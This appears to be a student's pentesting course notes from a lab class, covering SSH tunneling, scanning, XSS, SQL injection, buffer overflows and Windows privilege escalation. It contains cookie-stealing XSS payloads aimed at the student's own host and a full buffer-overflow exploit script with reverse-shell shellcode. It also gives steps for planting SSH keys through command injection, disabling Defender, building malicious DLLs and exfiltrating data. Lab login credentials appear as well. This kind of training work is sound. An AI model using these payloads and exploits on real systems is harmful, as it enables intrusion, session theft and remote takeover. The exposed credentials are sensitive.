ls
# TAKE GOOD NOTES 

# write down all tunnels. Just copy and paste after done with it
# Stack
6
Jump:
10.50.40.153
# Windows OP:
xfreerdp /v:10.50.28.142 /u:student /p:ZgoxLDNLHlzqU1a /size:1920x1000 +clipboard
# Linux OP:
```
ssh student@10.50.27.207 -X
```
# CTFD server
Username:
DODU-005-M
ZgoxLDNLHlzqU1a	
## Set up control socket (to jump box. exchange the ip and /tmp/* to where your going)
```
 ssh -MS          /tmp/jump             student@10.50.40.153
      ^               ^                           ^
Master socket   Directory + name         Normal login with ssh
```

ssh -MS /tmp/jump student@10.50.40.153
## Ping sweep
Linux
```
for i in {97..130}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
```
Windows
```
for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.
```
## Dynamic port forward 
```
ssh -S /tmp/jump jump            -O forward -D9050 
     ^             ^                ^
  No loggin   Device name      Dynamic forward
```
ssh -S /tmp/jump jump -O forward -D9050
## proxychains nmap scan for open ports
```
nmap -sS -Pn 8.8.8.8 -p 135-139,22,80,443,21,8080
proxychains nmap 192.168.28.100
```
Using netcat
```
nc -z -v -w 1 8.8.8.8 440-443
```
## Banner grabbing (exchange ip and last number to what your looking for)
proxychains nc 192.168.28.100 2222
## Port forwarding to found ports
ssh -S /tmp/jump jump -O forward -L 1111:192.168.28.100:80 -L3333:192.168.28.100:2222
(Creates a local tunnel to both port 80 and port 2222, use any high port, use firefox for port 80)

## Cancel port forwards
ssh -S /tmp/jump jump -O cancel -L 1111:192.168.28.100:80
(can do one port or the entire previous ssh command. could also kill the pid)
ssh -S /tmp/jump jump -O cancel -D9050

## going to the next box (t1 is target 1)
ssh -MS /tmp/t1 credentials@127.0.0.1 -p 3333
(same as initial tunnel)

# Phases of Pentesting
Phase 1: Mission Definition
  Goals and targets, scope, RoE
Phase 2: Recon
  Info gathering
Phase 3: Footprinting
  get data through scan/interaction
Phase 4: Exploitation & Initial Access
  Gain an initial foothold
Phase 5: Post-Exploitation
  persistence, Escalate privileges, cover tracks, Exfiltrate target data
Phase 6: Document Mission

# Data to collect
```
Web Data
  Cached Content, Analytics, Proxy Web Application, Command Line Interrogation
Sensitive Data
  Business Data, Profiles, Non-Profits/Charities, Business Filings, Historical and Public Listings
Publicly Accessible
  Physical Addresses, Phone Numbers, Email Addresses, User Names, Search Engine Data, Web and Traffic Cameras, Wireless Access Point Data
Social Media
  Twitter, Facebook, Instagram, People Searches, Registry and Wish Lists
Domain and IP Data
  DNS Registration, IP Address Assignments, Geolocation Data, Whois
```
# Hyper-Text Markup Language (HTML)
```
Standardized markup language for browser interpretation of webpages
  Client-side interpretation (web browser)
  Utilizes elements (identified by tags)
  Typically redirects to another page for server-side interaction
  Cascading Stylesheets (CSS) for page themeing
```
# Scraping Data
Prep
```
pip install lxml requests
```
# Script
#!/usr/bin/python
import lxml.html
import requests

page = requests.get('http://quotes.toscrape.com')
tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')

print ('Authors: ',authors)

# Advanced Scanning Techniques
1) Host Discovery
  Find hosts that are online
2) Port Enumeration
  Find ports for each host that is online
3) Port Interrogation
  Find what service is running on each open/available port

# NMAP USAGE AND EXAMPLES (file path /usr/share/nmap/scripts)
```
nmap --script <filename>|<category>|<directory>|<expression>[,…​]

Runs all scripts that match defined criteria.

nmap --script-help "<filename>|<category>|<directory>|<expression>[,…​]"

Shows help content for specific scripts, categories, etc.

nmap --script-args <args>

Allows options definied within the script to be ran in conjunction with the script.

nmap --script-args-file <filename>

Allows options definied within the script to be pre listed in a file and then ran in conjunction with the script.

nmap --script-help <filename>|<category>|<directory>|<expression>|all[,…​]

Shows help about scripts. For each script matching the given specification, Nmap prints the script name, its categories, and its description.

nmap --script-trace

Similar to --packet-trace as it will output traffic data to include protocol, source, destination, and transmitted data.


dns-brute.nse

Find valid DNS (A) records by trying a list of common sub-domains and finding those that successfully resolve.

nmap -p 80 --script dns-brute.nse <domain name>
hostmap-bfk.nse

Find virtual hosts on an IP address that you are attempting to compromise (or assess).

nmap -p 80 --script hostmap-bfk.nse <domain name>
traceroute-geolocation.nse

Perform a traceroute to your target IP address and have geolocation data plotted for each hop along the way.

nmap --traceroute --script traceroute-geolocation.nse -p 80 <domain name>
http-enum.nse

Attempts will be made to find valid paths on the web server that match a list of known paths for common web applications.

nmap --script http-enum <IP Address>

  --script-args http-enum.basepath='<Web Server Dir/>' <IP Address>
This entry shows an example of utilizing the --script-args option, identifying a valid value from within the script in order to narrow the scan.

smb-os-discovery.nse

Determines the operating system, computer name, netbios name and domain of a system.

nmap -p 445 --script smb-os-discovery <IP Address / Subnet>
firewalk.nse

Discovers firewall rules using an IP Protocol Time To Live (TTL) expiration technique

nmap -p 80 --script=firewalk.nse <IP Address>

  --script-args=firewalk.max-retries=1 <IP Address>
  --script-args=firewalk.probe-timeout=400ms <IP Address>
  --script-args=firewalk.firewalk.max-probed-ports=7 <IP Address>
This entry shows examples of utilizing the --script-args option, identifying a valid value from within the script in order to narrow the scan.
```
# Web Exploitation (Day 1 XSS)

Server/Client Relationship
```
Synchronous communications between user and services
Not all data is not returned, client only receives what is allowed
```
# HTTP Response Codes
```
10X == Informational
2XX == Success
30X == Redirection
4XX == Client Error
5XX == Server Error
```
# wget (not recommended)
```
wget -r -l2 -P /tmp ftp://ftpserver/
wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
wget --load-cookies cookies.txt -p https://website/interesting/article.php
```
# GET request
```
https://www.columbiacountyga.gov/Home/Components/JobPosts/Job/1/1
/something.php?var=hi (the ? will allow us to send info to the webserver)\
```
# cURL(not recommended)
```
Not recursive
Can use pipes
Upload ability
Supports more protocols vs Wget, such as SCP & POP3
curl -o stuff.html https://web.site/stuff.html
curl 'https://web.site/submit.php' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png
```
JavaScript (JS)
```
Allows websites to interact with the client

JavaScript runs on the client’s machine

Coded as .js files, or in-line of HTML
```
# JS Interaction
```
<script>
function myFunction() {
    document.getElementById("demo").innerHTML = "Paragraph changed.";
}
</script>
<script src="https://www.w3schools.com/js/myScript1.js"></script>
```
Web Developer then call function by finction_name()
# Enumeration
```
Robots.txt
Legitimate surfing
Tools:
 NSE scripts
 Nikto
 Burp suite (outside class)
```
# Cross-Site Scripting (XSS) Overview
```
Insertion of arbitrary code into a webpage, that executes in the browser of visitors
Unsanitized GET, POST, and PUT methods allow JS to be placed on websites
Often found in forums that allow HTML
```
# Reflected XSS
```
Most common form of XSS
Transient, occurs in error messages or search results
Delivered through intermediate media, such as a link in an email
Characters that are normally illegal in URLs can be Base64 encoded
```
# Stored XSS
```
Resides on vulnerable site
Only requires user to visit page
<img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
```
# Useful JavaScript Components
```
Proof of concept (simple alert):
<script>alert('XSS');</script>

Capturing Cookies
 document.cookie

Capturing Keystrokes
 bind keydown and keyup

Capturing Sensitive Data
 document.body.innerHTML
```
# command to compromise web page (in a chat bar or something of the sort)
```
python3 -m http.server
<script/>document.location="http://10.50.27.207:8000/"+documnet.cookie;</script>
```
# Server-Side injection
```
  Directory Traversal/Path Traversal
Ability to read/execute outside web server’s directory
Uses ../../ (relative paths) in manipulating a server-side file path

view_image.php?file=../../etc/passwd
```
# fle locations for linux
```
/etc/passwd + /etc/hosts
```
# Malicious File Upload
```
  Site allows unsanitized file uploads

Server doesn’t validate extension or size
Allows for code execution (shell)
Once uploaded
 Find your file
 Call your file
place to upload, call file, location where its uploaded to
```
run image.png.php
# on the website commands from the script
whoami
pwd
# Command injection
; [command line] will overwrite there script they have
/var/www/html for home directory of apache

# uploading ssh key
; mkdir [home directory]/.ssh (on webpage)
ls -la ../../.ssh/ [on box]
ssh-keygen -t rsa -b 4096 [on box to generate new ssh keys with no passphrases]
cat ls -la ../../.ssh/id_rsa.pub (copy the entire file)
; echo "(what you copied from ssh)" > [home directory]/.ssh/authorized_keys (on webpage)
;cat [home directory]/.ssh/authorized_keys (make sure it works)
ssh -i ~/.ssh/id_rsa [user]@[ip] (on host)


# How to get cookies from a message box
```
on lin-ops:
cd /home
python3 -m http.server

on website:
<script>document.location="http://10.50.27.207/Cookie_Stealer1.php?username=" + document.cookie;</script>
```
# How to traverse directories on websites
```
if it looks like the path below, make sure to put the commands in the books= portion to traverse through
http://127.0.0.1:5432/books_pick.php?book=web
example http://127.0.0.1:5432/books_pick.php?book=../../../../etc/passwd
```
# going to other peoples directories
```
after log in just cd ../ to see other users available
```

# SQL
S tructured Q uery L anguage - ANSI Standard
# Standard Commands
```
SELECT: Extracts data from a database
UNION: Used to combine the result-set of two or more SELECT statements
USE: Selects the DB to use
UPDATE: Updates data in a database
DELETE: Deletes data from a database
INSERT INTO: Inserts new data into a database
CREATE DATABASE: Creates a new database
ALTER DATABASE: Modifies a database
CREATE TABLE: Creates a new table
ALTER TABLE: Modifies a table
DROP TABLE: Deletes a table
CREATE INDEX: Creates an index (search key)
DROP INDEX: Deletes an index
```
https://www.w3schools.com/SQL/sql_syntax.asp
# sql commands
```
mysql
help (gives help) ;
show databases ; (will show what is on the box info mysql and performance are the default databases)
use information_schema ; (drops into the database itself, contains info on other databases it is connected to)
show columns from columns ; (important fields are Column_name(saves column names in the database), Table_schema(), Table_name(info on table in the databases))
select table_name from information_schema.columns ; (from the information_schema.columns database it will show all the table names available)
select table_name,column_name from information_schema.columns ; (adds columns name to last command)
select table_schema,table_name,column_name from information_schema.columns ; (golden statement)
show tables from session ; (dumps data bases from session)
show columns from session.Tires ; (Can be case sensitive)
select tireid,name,size from session.Tires ; (look in header field from previous command to get what to look at)
select tireid,name,size from session.Tires UNION SELECT name,tpye,cost from session.car ; (can get two databases in one display, if one field has more columns then the other add a number to the first part to allow another column to be created. example below)
select tireid,name,size, 4 from session.Tires UNION SELECT name,tpye,cost,color from session.car ; (will show header as tireid name size 4 ut it will have all the info needed)
SELECT  * FROM movies where year not between 2000 and 2010; (finds all information not between the years written)
SELECT * FROM movies where title LIKE "Toy Story%"; (finds information that is like what is written. % can be before or after as a matching tool)
SELECT * FROM movies where year > 2009 order by year desc ; (List the last four Pixar movies released (ordered from most recent to least) )
SELECT title FROM movies
ORDER BY title ASC
LIMIT 5 OFFSET 5; (List the next five Pixar movies sorted alphabetically )
SELECT city, latitude FROM north_american_cities
WHERE country = "United States"
ORDER BY latitude DESC; (Order all the cities in the United States by their latitude from north to south )
```
# SQL Injection - Considerations
```
Requires Valid SQL Queries
Fully patched systems can be vulnerable due to misconfiguration
Input Field Sanitization
String vs Integer Values
Is information_schema Database available?
GET Request versus POST Request HTTP methods
```
# Unsanitized vs Sanitized Fields
```
Unsanitized: input fields can be found using a Single Quote ⇒ '
  Will return extraneous information
  ' closes a variable, to allow for additional statements/clauses
  May show no errors or generic error (harder Injection)
Sanitized: input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)
Validation: checks inputs to ensure it meets a criteria (String doesn’t contain ')
```
#Server-Side Query Processing
```
User enters JohnDoe243 in the name form field and pass1234 in the pass form field.
The Server-Side Query that would be passed to MySQL from PHP would be:
BEFORE INPUT:
 SELECT id FROM users WHERE name=‘$name’ AND pass=‘$pass’;
AFTER INPUT:
 SELECT id FROM users WHERE name=‘JohnDoe243’ AND pass=‘pass1234’;
```
# Example - Injecting Your Statement
```
User enters tom' OR 1='1 in the name and pass fields.
Truth Statement: tom ' OR 1='1
Server-Side query executed would appear like this:
SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
```
# Stacking Statements
```
Chaining multiple statements together using a semi-colon ;
SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; --’
```
# Nesting statements
```
Some Web Application + SQL Database combinations do not allow stacking, such as PHP and MySQL.
Though they may allow for nesting a statement within an existing one:
php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
```
# Ignore the rest
```
Using # or -- tells the Database to ignore everything after
Server-Side Query:
SELECT product FROM item WHERE id = $select limit 1;
Input to Inject:
1 or 1=1; #
Server-Side Query becomes:
SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;
```
# Blind Injection
```
Inlcudes Statements to determine how DB is configured
  Columns in Output
  Can we return errors
  Can we return expected Output
Used when unsanitized fields give generic error or no messages
       Normal Query to pull expected output:
       php?item=4
       Blind injection for validation:
       php?item=4 OR 1=1
Try ALL combinations! item=1, item=2, item=3, etc
```
# Abuse The Client (GET METHOD)
```
Passing injection through the URL:
After the .php?item=4 pass your UNION statement
prices.php?item=4 UNION SELECT 1,2
prices.php?item=4 UNION SELECT 1,2,@@version
What is @@version?
```
# Abuse The Client (Enum)
```
Identifying the schema leads to detailed queries to enumerate the DB
Research Database Schemas and what information they provide
php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()
What are information_schema and database()?
```
# Defending Against
```
Validate inputs! Methods differ depending on software
concatenate : turns inputs into single strings or escape characters
PHP: mysql_real_escape_string
SQL: sqlite3_prepare()
```
# SQL post and get methods
```
' OR 1='1 (enter into username and password) (post method)
click F12 and find the post request, go to the request tab, click raw then add a ? to end of url with the raw you get at the end and we get all user logins (get method)
example http://10.50.29.140/login.php?username=%27+OR+1%3D%271+&passwd=%27+OR+1%3D%271+
```
# Sql vulnerablity
```
10.50.29.140 for practice on how to do sql injections
(Post method)
1) Identify vulnerable field (example V)
 [name]' OR 1='1 with all the things to get what is vulnerable
2) find number of columns we can see (example V)
 [name]' UNION SELECT 1,2,3,4,5 #
3) Dump the data base and write down everything that is user created
   [name]' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns # (since are golden rule only has 3 things to look at we had to add numbers where it would show us the infor we wanted)
4) get the info from the correct fields
   [name]' UNION SELECT username,2,passwd,jump,5 FROM [usercreatedfield].userinfo # the fields should look like this when looking things up
(Get Method)
1)click on first link and test if it is vulnerable =1 OR 1=1 and continue till it works
2) put Union SELECT 1,2,3 and so on till you find out how it what is available
3) @@version will give what ther version of the data base is.
```
# Exploit Development

# Buffer Overflow Common Terms
```
Heap: Memory that can be allocated and deallocated
Stack: A contiguous section of memory used for passing arguments (our goal is to put executable code into the stack)
Registers: Storage elements as close as possible to the central processing unit (CPU)
Instruction Pointer (IP): a.k.a Program Counter (PC), contains the address of next instruction to be executed
Stack Pointer (SP): Contains the address of the next available space on the stack
Base Pointer (BP): The base of the stack
Function: Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
Shellcode: The code that is executed once an exploit successfully takes advantage of a vulnerability
```
# Buffer Overflow Defenses 
```
Non executable (NX) stack
Address Space Layout Randomization (ASLR)
Data Execution Prevention (DEP)
Stack Canaries (security cookies in windows)
Position Independent Executable (PIE)
```

# Technical Help
```
Utilizing tools such as:
  IDA, GHIDRA
  GDB, MONA, IMMUNITY
  BASH, PYTHON
```
# Linux 
# passing args to a executable (bash)
./func $(echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa") (see if it can be passed into it as a argument)
./func <<<$(echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa") (passes into it when it runs)
gdb {executable} (debugger)
run (use run to run function)
info functions (shows the functions in that executable)
pdisass (color coded breakdown)
shell (gives us a shell)

# steps to buffer overflow
1) gdb ./[file] run this to get a debug stream
2) use run <<<$(./buff.py) to figure out where the overflow starts (https://wiremask.eu/)
3) get clean gdb:
         env - gdb ./[file]
         show env
         unset env COLUMNS
         unset env LINES
         run (manually overflow)
         info proc map (shows part of heap and all of the stack)
         grab first address after heap (start address)
         GRAB END ADDRESS from [stack]
         adjust script with # find /b [start], [end], 0xff, 0xe4 (looks for jmp esv)
         run it in clean gdb and get the first 4 results
4) use  msfvenom --list payloads to see all payloads\
5) msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python (run this)
6) replace eip with first "\xXX" and add nop = "\x90" * 15-20 (choose a number)
7) add in code from msfvenom
8) add code you get from msfvenom and then run the script in gdb
9) then run the file against the script
10) 
 env - gdb ./func

# Windows

1) strings the program to look through it to see if it is for windows (will have dll) or linux
2) get-content [file] | select -first 1   (look for MZ for windows)
3) if opens listening prot start new powershell and run netstat -anob
4) find the service and find its port
5) go to linux and run nc [ip] [port]
6) see what the port does and get as much onfo as possible
7) Open ghidra and try to find TRUN or the command we run
8) close ghidra and open immunity debugger as admin
9) File -> attach -> process id of whats running (it will pause the program when it attaches, press play to let ir run again, << rewind button for when we break it)
10) click play to run program
11) go to lin ops to build exploit and verify size of buffer and send data to server
12) go to wiremask and get set the size to what the buffer is
13) run script on lin-ops and then look at results in the immunity debugger screeen in the top right eip section will have a value
14) delete buf += line, add back buf += "A" * number from wiremask, add another buf += "BBBB"
15) rewind program on windows then press play
16) run script again to make sure it actually overrides the script by checking EIP has 42424242
17) find jump esp locations by seraching !mona modules. it will bring up a window with dlls and more
18) find the vulnerable dll that we can exploit, run !mona jmp -r esp -m"[dll that is exploitable]"
19) click window -> log data then it will show the jmp esp locations
20) grab first 4 of results and right click copy to clipboard then paste it in. change upper case letters to lower case
21) sepperate then reverse the order (0x625012a0 -> 62 50 12 A0 "\xa0\x12\x50\x62")
22) grab first jmp esp location and a dd it in where the 4 BBBB are, also add buf += "\x90" * 15
23) generate a payload with msfvenom -p windows/shell/reverse_tcp lhost=192.168.65.20 lport=10006 -b "\x00" -f python    (everything outside the network can talk to the 10.50.XX.XX) then copy results into the script
24) set up a msconsole, use multi/handler, show options, set payload windows/meterpreter/reverse_tcp, set LHOST 0.0.0.0, set LPORT 10006, ctrl+c the last running of script, go to windows op staiton, rewind and play so the it is running, turun off realtime protection from windows defender
25) up arrow, click on sheild icon, click virus and protections settings, turn off real time protection
26) back on temrinator, in msfconsole run exploit
27) run script and pray the shell code worked (make sure to play the script.)



#!/usr/bin/env python
import socket

buf = "TRUN /.:/"
buf += "A" * 2003
buf += "\xa0\x12\x50\x62"
buf += "\x90" * 15
'''
0x625012a0 -> 62 50 12 A0 "\xa0\x12\x50\x62"
0x625012ad -> 62 50 12 AD "\xad\x12\x50\x62"
0x625012ba -> 62 50 12 BA "\xba\x12\x50\x62"
0x625012c7 -> 62 50 12 C7 "\xc7\x12\x50\x62"

'''
buf += b"\xdb\xc6\xb8\xc1\xf1\xc6\x5a\xd9\x74\x24\xf4\x5b"
buf += b"\x2b\xc9\xb1\x59\x31\x43\x19\x83\xc3\x04\x03\x43"
buf += b"\x15\x23\x04\x3a\xb2\x2c\xe7\xc3\x43\x52\xd9\x11"
buf += b"\xca\x77\x7d\x1d\x9f\x47\xf5\x73\x2c\x2c\x5b\x60"
buf += b"\x23\x85\x16\xae\x0a\x16\x2d\xdc\x44\xd9\xf2\x8d"
buf += b"\xa9\x78\x8f\xcf\xfd\x5a\xae\x1f\xf0\x9b\xf7\xe9"
buf += b"\x7e\x74\xa5\x62\xd2\x9a\xc1\x37\xef\x9b\x05\xe0"
buf += b"\x84\xdb\xdd\x8a\x5b\xaf\x51\x94\x8b\xc4\x32\xb6"
buf += b"\x2a\x09\x92\x3d\x64\xb5\x96\x8b\x01\xf9\xd1\x3a"
buf += b"\x15\x8a\xd6\xb7\xe8\x5a\x27\x08\x2b\xad\x45\x24"
buf += b"\xad\xf6\x6e\xd4\xdb\x0c\x8d\x69\xdc\xd7\xef\xb5"
buf += b"\x69\xc7\x48\x3d\xc9\x23\x68\x92\x8c\xa0\x66\x5f"
buf += b"\xda\xee\x6a\x5e\x0f\x85\x97\xeb\xae\x49\x1e\xaf"
buf += b"\x94\x4d\x7a\x6b\xb4\xd4\x26\xda\xc9\x06\x8e\x83"
buf += b"\x6f\x4d\x3d\xd5\x10\xae\xbd\xda\x4c\x38\x71\x17"
buf += b"\x6f\xb8\x1d\x20\x1c\x8a\x82\x9a\x8a\xa6\x4b\x05"
buf += b"\x4c\xbf\x5c\xb6\x82\x07\x0c\x48\x23\x77\x04\x8f"
buf += b"\x77\x27\x3e\x26\xf8\xac\xbe\xc7\x2d\x58\xb5\x5f"
buf += b"\x0e\x34\x88\x8b\xe6\x46\x0b\x93\xe0\xcf\xed\x8b"
buf += b"\x5c\x9f\xa1\x6b\x0d\x5f\x12\x04\x47\x50\x4d\x34"
buf += b"\x68\xbb\xe6\xdf\x87\x15\x5e\x48\x31\x3c\x14\xe9"
buf += b"\xbe\xeb\x50\x29\x34\x19\xa4\xe4\xbd\x68\xb6\x11"
buf += b"\xda\x92\x46\xe2\x4f\x92\x2c\xe6\xd9\xc5\xd8\xe4"
buf += b"\x3c\x21\x47\x16\x6b\x32\x80\xe8\xea\x02\xfa\xdf"
buf += b"\x78\x2a\x94\x1f\x6d\xaa\x64\x76\xe7\xaa\x0c\x2e"
buf += b"\x53\xf9\x29\x31\x4e\x6e\xe2\xa4\x71\xc6\x56\x6e"
buf += b"\x1a\xe4\x81\x58\x85\x17\xe4\xda\xc2\xe7\x7a\xf5"
buf += b"\x6a\x8f\x84\x45\x8b\x4f\xef\x45\xdb\x27\xe4\x6a"
buf += b"\xd4\x87\x05\xa1\xbd\x8f\x8c\x24\x0f\x2e\x90\x6c"
buf += b"\xd1\xee\x91\x83\xca\x01\xeb\xec\xed\xe2\x0c\xe5"
 buf += b"\x89\xe3\x0c\x09\xac\xd8\xda\x30\xda\x1f\xdf\x06"
 buf += b"\xd5\x2a\x42\x2e\x7c\x54\xd0\x30\x55"

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.65.10",9999))
print s.recv(1024)
s.send(buf)
print s.recv(1024)
s.close()

# Post Exploitation
# Windows Targets
```
netsh interface portproxy add v4tov4 listenport=<LocalPort> listenaddress=<LocalIP> connectport=<TargetPort> connectaddress=<TargetIP> protocol=tcp
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=<LocalPort>
netsh interface portproxy reset
```
# SSH Keys
```
SSH keys are asymetric(public/private) key pairs that can be used to authenticate a user to a system in combination with or to replace the use of a password
If you are able to find a users private ssh key it can potentially be used to gain access to other systems
Using Stolen SSH Keys
Bring private key to your own box
On your box:
chmod 600 /home/student/stolenkey
ssh -i /home/student/stolenkey jane@1.2.3.4  (only with stolen key)
ssh as the user who is the original key owner
```
# configuration for paths
```
Configuration File Method (~/.ssh/ssh_config)
HostName *
ControlPath ~/.ssh/controlmasters/%r@%h:%p
ControlMaster auto
ControlPersist 10m
```
# Local Host Enumeration
# User Enumeration
```
Why is this important?
What does it provide?
Windows
net user
Linux
cat /etc/passwd
```
# Process Enumeration
```
Why is this important?
What does it provide?
Windows
tasklist /v
Linux
ps -elf
```
# Service Enumeration
```
Why is this important?
What does it provide?
Windows
tasklist /svc
Linux
chkconfig                   # SysV
systemctl --type=service    # SystemD
```
# Network Connection Enumeration
```
Why is this important?
What does it provide?
Windows
ipconfig /all
Linux
ifconfig -a      # SysV (deprecated)
ip a             # SystemD
```
Data Exfiltration
```
Session Transcript
 ssh <user>@<host> | tee
Obfuscation (Windows)
type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
certutil -encode <file> encoded.b64
Obfuscation (Linux)
cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
cat <file>> | base64
Encrypted Transport
scp <source> <destination>
ncat --ssl <ip> <port> < <file>
```
# cat etc/host on linux machines first + check persistance (cronjob and stuff)
# Privilege Escalation, Persistence & Covering Your Tracks (Windows)
```
DLL Search Order
Executables check the following locations (in successive order):
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
The directory the the Application was run from
The directory specified in in the C+ function GetSystemDirectory()
The directory specified in the C+ function GetWindowsDirectory()
The current directory
```
# Windows Integrity Mechanism
```
        Integrity Levels
Untrusted: Anonymous SID access tokens
Low: Everyone SID access token (World)
Medium: Authenticated Users
High: Administrators
System: System services (LocalSystem, LocalService, NetworkService)(services and scheduled tasks)
```
# User Account Control (UAC)
```
Always Notify
Notify me only when programs try to make changes to my computer
Notify me only when programs try to make changes to my computer (do not dim my desktop)
Never notify
```
# Checking UAC Settings
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
```
# AutoElevate Executables
```
get-psdrive
cd to drive
.\sigcheck.exe -m -accepteula C:\windows\system32\file
Requested Execution Levels:
 asInvoker
 highestAvailable
```
# Scheduled Tasks & Services
```
Items to evaluate include:
Write Permissions
Non-Standard Locations
Unquoted Executable Paths
Vulnerabilities in Executables
Permissions to Run As SYSTEM
```
# Finding vulnerable Scheduled Tasks
```
schtasks /query /fo LIST /v
```
# DLL Hijacking
```
Identify Vulnerability
Take advantage of the default search order for DLLs
NAME_NOT_FOUND present in executable’s system calls
Validate permissions
Create and transfer Malicious DLL
```
# Finding Vulnerable Services
```
wmic service list full
sc query
```
# Windows 
```
sc.exe to create service
sc.exe create puttyService binPath='C:\Program Files (x86)\Putty\putty.exe' displayname='puttyService start=auto
open task scheduler
new task, name it then click new, triggers tab, at startup, Actions tab, new, browse for location and then ok, general tab, change user, search for system then ok

look at services on windows machine to find anything that does not have description or mispellings
icacls 'C:\Program Files (x86)\Putty' /grant BUILTIN\Users:W
net use z: "\\http://live.sysinternals.com" /persistent:yes
cd z:
./procmon.exe -accepteula
filter -> process name contains putty.exe -> path contains dll -> result is NAME NOT FOUND
if does not work run: (get-process | ?{$_.name -like "putty"}).kill()
find a dll in the same directory as the file 
example of a payload
msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
for services
sudo msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\Desktop\whoami.txt' -f exe > putty.exe
```
# Audit Logging
```
Show all audit category settings
auditpol /get /category:*
What does the below command show?
auditpol /get /category:* | findstr /i "success failure"
```
# Event Logging (just run event viewer windows event log viewer)
```
Storage: c:\windows\system32\config\

File-Type: .evtx/.evt

wevtutil el
wmic ntevent where "logfile="<LOGNAME>" list full
```
# PowerShell Logging
```
Windows CLI CMD history is per instance (doskey /history)
Powershell can be set to log sessions
 2.0 little evidence
  Nothing about what was executed
 3.0 Module logging (EventID 4103)
 4.0 Module logging
 5.0 Can set module, script block (EventID 4104) and transcription
Get-Eventlog -List
```
# Additional Logging
```
Determine PS version (bunch of ways)
reg query hklm\software\microsoft\powershell\3\powershellengine\

powershell -command "$psversiontable"
Determine if logging is set (PowerShell and WMIC)
reg query [hklm or hkcu]\software\policies\microsoft\windows\powershell
reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging
# 0 = no | 1 = errors | 2 = verbose
WMIC Log Storage
%systemroot%\system32\wbem\Logs\
```
